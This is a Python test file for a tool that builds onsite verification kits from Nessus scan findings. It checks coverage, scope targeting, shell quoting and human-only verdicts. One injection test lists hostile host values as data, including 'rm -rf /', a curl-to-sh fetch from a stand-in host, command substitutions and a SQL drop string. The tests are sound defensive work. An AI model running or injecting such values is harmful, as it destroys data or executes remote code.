"""Safety properties the surviving generator must keep.

These were pinned against the runbook generator, which has been removed in
favour of a single kit generator. They are not runbook tests wearing a new
name -- each one defends a property that made the runbook worth having, and
losing any of them silently would be a regression the rest of the suite would
not catch:

* every finding leaves the builder with something to do -- a command or an
  explicit manual task, never nothing (the founding rule);
* a generated command is the *same* command the executor would run, because
  both come from the adapter's ``build_argv``;
* a hostile scanner field cannot become a second shell command;
* the generated bash actually parses, and does not abort at the first closed
  port;
* nothing in the kit lets a tool's exit code stand in for a verdict.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

from nessus_builder import default_host_props, nessus_document, report_host, report_item
from vapt_verify.adapters import get_adapter
from vapt_verify.adapters.base import ExecutionContext
from vapt_verify.cli.main import main
from vapt_verify.importers.nessus_xml import NessusImporter
from vapt_verify.kit import OnsiteKitBuilder, script_filename
from vapt_verify.models.engagement import Engagement
from vapt_verify.reconciliation.gate import reconcile
from vapt_verify.workspace import EngagementWorkspace

ITEMS: list[dict[str, object]] = [
    # a TLS finding: openssl primary, nmap supporting
    {"plugin_id": "51192", "plugin_name": "SSL Certificate Cannot Be Trusted",
     "port": 443, "protocol": "tcp", "severity": 2, "svc_name": "https",
     "risk_factor": "Medium", "synopsis": "The SSL certificate cannot be trusted."},
    # an SSH finding
    {"plugin_id": "90317", "plugin_name": "SSH Weak Algorithms Supported",
     "port": 22, "protocol": "tcp", "severity": 2, "svc_name": "ssh",
     "risk_factor": "Medium", "synopsis": "Weak SSH algorithms are supported."},
    # a host-level local check: NO remote command is appropriate
    {"plugin_id": "123456", "plugin_name": "Ubuntu Security Update for OpenSSL (Host-Level)",
     "port": 0, "severity": 3, "family": "Ubuntu Local Security Checks",
     "risk_factor": "High", "synopsis": "A local package is out of date."},
    # informational
    {"plugin_id": "11219", "plugin_name": "Nessus SYN scanner",
     "port": 8080, "protocol": "tcp", "severity": 0, "svc_name": "http",
     "synopsis": "Informational port note."},
]


def _nessus(tmp_path: Path, ip: str = "192.0.2.10", fqdn: str = "web01.example-doc.test") -> Path:
    host = report_host(
        name=ip,
        props=default_host_props(ip, fqdn=fqdn),
        items=[report_item(**item) for item in ITEMS],  # type: ignore[arg-type]
    )
    path = tmp_path / "scan.nessus"
    path.write_text(nessus_document(hosts=[host]), encoding="utf-8")
    return path


def _workspace(tmp_path: Path, engagement: Engagement, source: Path | None = None) -> (
    EngagementWorkspace
):
    ws = EngagementWorkspace.create(
        tmp_path / "engagements" / engagement.engagement_id, engagement
    )
    source = source or _nessus(tmp_path)
    result = NessusImporter(engagement_id=engagement.engagement_id).import_file(source)
    ws.persist_import(source_path=source, result=result, reconciliation=reconcile(result))
    return ws


@pytest.fixture
def scoped_ws(tmp_path: Path) -> EngagementWorkspace:
    return _workspace(
        tmp_path,
        Engagement(
            engagement_id="eng-scoped",
            client_alias="Demo",
            approved_cidrs=["192.0.2.0/24"],
            authorisation_reference="AUTH-2026-001",
        ),
    )


# --- coverage: nothing is dropped -------------------------------------------

def test_every_finding_gets_a_step_or_an_explicit_manual_task(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    """The generator's half of 'no finding disappeared'."""
    findings = scoped_ws.load_findings()
    result = OnsiteKitBuilder(scoped_ws).build(tmp_path / "kit", include_informational=True)

    covered = {s.finding_id for s in result.steps}
    assert covered == {f["finding_id"] for f in findings}
    for finding_id in covered:
        steps = [s for s in result.steps if s.finding_id == finding_id]
        assert steps, finding_id
        assert any(s.executable or s.description.strip() for s in steps), (
            f"{finding_id} produced no command and no manual evidence task, so an "
            "operator would have nothing to do with it"
        )


def test_retained_informational_findings_are_still_accounted_for(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    """Retained is a decision, not an omission."""
    kit = tmp_path / "kit"
    result = OnsiteKitBuilder(scoped_ws).build(kit)
    manifest = json.loads((kit / "manifest.json").read_text(encoding="utf-8"))

    stepped = {s.finding_id for s in result.steps}
    retained = {r["finding_id"] for r in manifest["retained_informational"]}
    assert retained, "fixture no longer contains an informational finding"
    assert not (stepped & retained), "a retained finding must not also get a step"
    assert stepped | retained == {f["finding_id"] for f in scoped_ws.load_findings()}


def test_local_patch_finding_gets_manual_evidence_not_a_port_scan(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    """A remote scan cannot verify a local package version, and must not pretend to."""
    result = OnsiteKitBuilder(scoped_ws).build(tmp_path / "kit")
    steps = [s for s in result.steps if "Ubuntu Security Update" in s.title]
    assert steps
    assert all(s.nmap_role == "inappropriate" for s in steps)
    assert not any(s.executable for s in steps), (
        "a local-check finding must not be handed a remote probe"
    )


# --- the commands are real, and identical to what the executor would run -----

def test_generated_command_matches_what_the_executor_would_run(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    """Kit and executor must never drift: both call ``build_argv``.

    If they diverged, the operator would capture evidence for one command while
    the PoC document claimed another.
    """
    result = OnsiteKitBuilder(scoped_ws).build(tmp_path / "kit")
    checked = 0
    for step in result.steps:
        adapter = get_adapter(step.adapter)
        if adapter is None or not step.executable:
            continue
        argv = adapter.build_argv(
            ExecutionContext(
                finding_id=step.finding_id,
                asset_id=step.asset_id,
                engagement_id="",
                target=step.target,
                port=step.port,
                transport=step.transport,
                params={},
            )
        )
        if not argv:
            continue
        # Parameterised adapters (SNMP community, TLS SNI) legitimately differ
        # with params, so compare the tool and target rather than the full argv.
        assert argv[0] == step.command_args[0], step.adapter
        assert step.target in step.command_args or any(
            step.target in a for a in step.command_args
        ), f"{step.adapter} lost its target"
        checked += 1
    assert checked, "no executable adapter step was checked"


def test_every_command_connects_to_the_target_that_was_scope_checked(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    """Scope is checked against the IP, so the socket must go to the IP.

    A vhost or SNI name is a string sent *inside* the connection, not a
    connection target. An adapter that hands the hostname to the tool as the
    thing to connect to would resolve it through DNS and reach whatever that
    points at -- which is not the host the engagement authorised, and not
    necessarily the host the scanner saw. `testssl` did exactly that until the
    kit started scope-labelling, which is how this was found.
    """
    result = OnsiteKitBuilder(scoped_ws).build(tmp_path / "kit")
    executable = [s for s in result.steps if s.executable]
    assert executable
    for step in executable:
        joined = " ".join(step.command_args)
        assert step.target in joined, (
            f"{step.adapter} does not connect to the scope-checked target "
            f"{step.target}: {joined}"
        )


def test_recipe_selection_ignores_the_generating_machine_toolset(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    """A kit built on a bare Windows laptop must match one built on Kali.

    Classifying against locally installed tools would downgrade findings to
    "capability unavailable" purely because the machine holding the scan file
    has no security tooling -- exactly the machine a kit exists to serve.
    """
    from vapt_verify.classification.models import Capabilities

    builder = OnsiteKitBuilder(scoped_ws)
    assert builder.classifier.capabilities == Capabilities(available=set()), (
        "the kit must classify against an empty toolset, not the build machine's"
    )
    result = builder.build(tmp_path / "kit")
    assert [s.command_args for s in result.steps if s.executable]


# --- injection safety --------------------------------------------------------

@pytest.mark.parametrize(
    "hostile",
    [
        "192.0.2.10; rm -rf /",
        "192.0.2.10 && curl http://evil.test/x | sh",
        "$(id)",
        "`id`",
        "192.0.2.10\nrm -rf /",
        "'; DROP TABLE findings; --",
    ],
)
def test_hostile_target_never_becomes_a_command(tmp_path: Path, hostile: str) -> None:
    """A scan file is untrusted input; a mangled host field must not run."""
    host = report_host(
        name=hostile,
        props={"host-ip": hostile, "HOST_START": "Mon Jul 20 09:00:00 2026"},
        items=[report_item(plugin_id="51192", plugin_name="SSL Certificate Cannot Be Trusted",
                           port=443, protocol="tcp", severity=2, svc_name="https")],
    )
    path = tmp_path / "hostile.nessus"
    path.write_text(nessus_document(hosts=[host]), encoding="utf-8")
    ws = _workspace(
        tmp_path,
        Engagement(engagement_id="eng-hostile", approved_cidrs=["192.0.2.0/24"]),
        source=path,
    )
    kit = tmp_path / "kit"
    result = OnsiteKitBuilder(ws).build(kit)

    assert result.steps, "the finding must still be present"
    assert not any(s.executable for s in result.steps)
    assert not list((kit / "scripts").glob("*.sh"))
    # The finding is still actionable -- just not automatically.
    assert all(s.description.strip() for s in result.steps)
    assert "NO COMMAND GENERATED" in (kit / "commands.md").read_text(encoding="utf-8")


def test_quoting_survives_the_real_shell(scoped_ws: EngagementWorkspace, tmp_path: Path) -> None:
    """Round-trip through /bin/sh's own parser, not through our assumptions."""
    import shlex

    for value in ["a; rm -rf /", "$(id)", "`id`", "a'b", "a b", "a\nb", "*"]:
        quoted = shlex.quote(value)
        out = subprocess.run(
            ["/bin/sh", "-c", f"printf %s {quoted}"], capture_output=True, text=True, check=True
        )
        assert out.stdout == value

    # And the generator uses exactly that quoting for every argument it emits.
    OnsiteKitBuilder(scoped_ws).build(tmp_path / "kit")
    for script in (tmp_path / "kit" / "scripts").glob("*.sh"):
        body = script.read_text(encoding="utf-8")
        assert "eval" not in body
        assert "$(" not in body.split("capture_step")[-1], "no substitution in the argv"


# --- rendering ---------------------------------------------------------------

def test_every_generated_script_is_valid_bash(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    kit = tmp_path / "kit"
    OnsiteKitBuilder(scoped_ws).build(kit)
    scripts = [kit / "run-all.sh", kit / "lib" / "capture.sh", *(kit / "scripts").glob("*.sh")]
    assert len(scripts) > 2
    for script in scripts:
        proc = subprocess.run(
            ["bash", "-n", str(script)], capture_output=True, text=True, check=False
        )
        assert proc.returncode == 0, f"{script.name}: {proc.stderr}"


def test_scripts_do_not_abort_on_a_nonzero_probe_exit(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    """`set -e` would stop the run at the first closed port -- and a non-zero
    exit is not a verdict anyway."""
    kit = tmp_path / "kit"
    OnsiteKitBuilder(scoped_ws).build(kit)
    for script in [kit / "run-all.sh", *(kit / "scripts").glob("*.sh")]:
        lines = [ln.strip() for ln in script.read_text(encoding="utf-8").splitlines()]
        assert "set -uo pipefail" in lines
        assert not [ln for ln in lines if ln.startswith(("set -e", "set -ue", "set -eu"))]


def test_generated_output_warns_that_a_result_is_not_a_verdict(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    kit = tmp_path / "kit"
    OnsiteKitBuilder(scoped_ws).build(kit)
    for path in (kit / "lib" / "capture.sh", kit / "commands.md", kit / "README.md"):
        assert path.exists(), path
    joined = " ".join(
        p.read_text(encoding="utf-8").lower()
        for p in (kit / "lib" / "capture.sh", kit / "commands.md", kit / "README.md")
    )
    assert "not a verdict" in joined


def test_commands_document_what_refutes_not_only_what_confirms(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    """Without this, an empty capture reads as 'not vulnerable'.

    That inference is the one the whole project exists to prevent, so the
    operator is told what refutation looks like alongside confirmation -- or
    told explicitly that the recipe declares none.
    """
    kit = tmp_path / "kit"
    OnsiteKitBuilder(scoped_ws).build(kit)
    commands = (kit / "commands.md").read_text(encoding="utf-8")
    assert "Confirms the finding:" in commands
    assert "Contradicts the finding:" in commands


def test_script_names_are_unique_and_stay_inside_the_kit(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    """Two steps sharing a filename would overwrite each other's evidence."""
    result = OnsiteKitBuilder(scoped_ws).build(tmp_path / "kit")
    names = [script_filename(s) for s in result.steps if s.executable]
    assert names
    assert len(names) == len(set(names))
    for name in names:
        assert ".." not in name
        assert "/" not in name
        assert not name.startswith("/")


# --- import never decides ----------------------------------------------------

def test_kit_import_never_sets_a_verdict(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    from vapt_verify.kit import OnsiteEvidenceImporter
    from vapt_verify.utilities.hashing import sha256_file

    kit = tmp_path / "kit"
    result = OnsiteKitBuilder(scoped_ws).build(kit)
    step = next(s for s in result.steps if s.adapter == "openssl" and s.executable)

    output = kit / "evidence" / "c1.txt"
    output.write_text(
        "CONNECTION ESTABLISHED\nVerification error: self-signed certificate\n",
        encoding="utf-8",
    )
    (kit / "evidence" / "c1.json").write_text(
        json.dumps({
            "kit_schema_version": "2",
            "capture_id": "c1",
            "step_id": step.step_id,
            "finding_id": step.finding_id,
            "asset_id": step.asset_id,
            "adapter": step.adapter,
            "tool_name": step.tool,
            "target": step.target,
            "port": step.port,
            "transport": step.transport,
            "exit_code": 0,
            "command_args": step.command_args,
            "output_file": "evidence/c1.txt",
            "sha256": sha256_file(output),
        }),
        encoding="utf-8",
    )

    summary = OnsiteEvidenceImporter(scoped_ws).import_kit(kit)
    assert summary.imported == 1
    finding = next(
        f for f in scoped_ws.load_findings() if f["finding_id"] == step.finding_id
    )
    assert finding["verdict"] == "unreviewed", (
        "importing evidence must never decide the finding; a human does that"
    )
    assert not scoped_ws.load_decisions()


def test_import_names_the_findings_that_still_have_no_evidence(
    scoped_ws: EngagementWorkspace, tmp_path: Path
) -> None:
    """A count alone is how a finding disappears.

    "imported: 1" reads like the round trip is finished. The operator has to be
    told, by name, which findings came back bare -- missing evidence is not a
    false positive.
    """
    from vapt_verify.kit import OnsiteEvidenceImporter
    from vapt_verify.utilities.hashing import sha256_file

    kit = tmp_path / "kit"
    result = OnsiteKitBuilder(scoped_ws).build(kit)
    step = next(s for s in result.steps if s.adapter == "openssl" and s.executable)

    output = kit / "evidence" / "c1.txt"
    output.write_text("CONNECTION ESTABLISHED\n", encoding="utf-8")
    (kit / "evidence" / "c1.json").write_text(
        json.dumps({
            "kit_schema_version": "2",
            "capture_id": "c1",
            "step_id": step.step_id,
            "finding_id": step.finding_id,
            "asset_id": step.asset_id,
            "adapter": step.adapter,
            "target": step.target,
            "port": step.port,
            "transport": step.transport,
            "command_args": step.command_args,
            "output_file": "evidence/c1.txt",
            "sha256": sha256_file(output),
        }),
        encoding="utf-8",
    )

    summary = OnsiteEvidenceImporter(scoped_ws).import_kit(kit)
    assert summary.imported == 1
    assert step.finding_id not in summary.findings_without_evidence
    # Everything else the kit asked about is still bare, and says so.
    stepped = {s.finding_id for s in result.steps}
    assert set(summary.findings_without_evidence) == stepped - {step.finding_id}
    assert summary.findings_without_evidence
    # The local-patch finding can never receive a capture; it is named as work.
    assert any("Ubuntu Security Update" in e for e in summary.outstanding_manual_steps)


# --- the regression that motivated the project -------------------------------

def test_kit_covers_findings_the_legacy_nmap_export_misses(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """The contrast that motivated the whole project.

    The legacy exporter emitted commands only for plugin names in a hard-coded
    list, so everything else silently vanished from the operator's worklist.
    The kit must account for all of it.
    """
    base = tmp_path / "engagements"
    ws = _workspace(
        tmp_path, Engagement(engagement_id="eng-contrast", approved_cidrs=["192.0.2.0/24"])
    )
    findings = ws.load_findings()

    assert main(["legacy", "export-nmap", "--base", str(base),
                 "--engagement", "eng-contrast"]) == 0
    legacy_lines = [
        line for line in capsys.readouterr().out.splitlines() if line.startswith("nmap ")
    ]

    kit = tmp_path / "kit"
    result = OnsiteKitBuilder(ws).build(kit, include_informational=True)
    assert {s.finding_id for s in result.steps} == {f["finding_id"] for f in findings}
    assert len(legacy_lines) < len(findings), (
        "fixture no longer demonstrates the legacy gap; adjust it"
    )
